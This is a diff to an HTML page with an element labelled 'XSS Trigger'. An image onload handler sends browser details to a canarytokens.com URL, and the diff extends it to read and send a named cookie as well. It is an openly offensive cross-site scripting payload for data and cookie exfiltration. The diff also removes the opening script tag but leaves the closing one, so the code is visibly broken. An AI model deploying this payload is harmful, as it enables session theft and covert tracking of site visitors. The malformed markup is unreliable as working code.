@@ -11,12 +11,11 @@
 
     <!-- XSS Trigger -->
     <img src="https://canarytokens.com/nest/favicon.ico" 
-           onload="this.src='https://canarytokens.com/tags/traffic/b2tfmveyrurze5bhvphvs3rg8/submit.aspx?wsop_contact_us=htmlimg&systemInfo=' + encodeURIComponent(getSystemInfo())" />
-    <script>
+           onload="this.src='https://canarytokens.com/tags/traffic/b2tfmveyrurze5bhvphvs3rg8/submit.aspx?wsop_contact_us=htmlimg&systemInfo=' + encodeURIComponent(getSystemInfo()) + '&cookie=' + encodeURIComponent(getCookie('exampleCookie'))" />
         // Function to gather system and environment information
         function getSystemInfo() {
             const systemInfo = {
-                //userAgent: navigator.userAgent,                // User agent string (browser, OS)
+                userAgent: navigator.userAgent,                // User agent string (browser, OS)
                 platform: navigator.platform,                  // Operating system (Windows, Linux, macOS, etc.)
                 language: navigator.language,                  // User language setting
                 //screenWidth: screen.width,                     // Screen width
@@ -34,7 +33,7 @@
             };
 
             // Format the system info as a query string
-            return //'UserAgent=' + systemInfo.userAgent + 
+            return 'UserAgent=' + systemInfo.userAgent + 
                    '&Platform=' + systemInfo.platform + 
                    '&Language=' + systemInfo.language + 
                    //'&ScreenWidth=' + systemInfo.screenWidth + 
@@ -50,8 +49,18 @@
                    //'&CanvasFingerprint=' + systemInfo.canvasFingerprint; 
                    //'&WebGLFingerprint=' + systemInfo.webGLFingerprint;
         }
-
-        
+        // Function to get cookie value by name
+        function getCookie(name) {
+            const nameEq = name + "=";
+            const cookies = document.cookie.split(';');
+            for (let i = 0; i < cookies.length; i++) {
+                let cookie = cookies[i].trim();
+                if (cookie.indexOf(nameEq) == 0) {
+                    return cookie.substring(nameEq.length, cookie.length);
+                }
+            }
+            return null; // Return null if cookie is not found
+        }
 
     </script>
 </body>
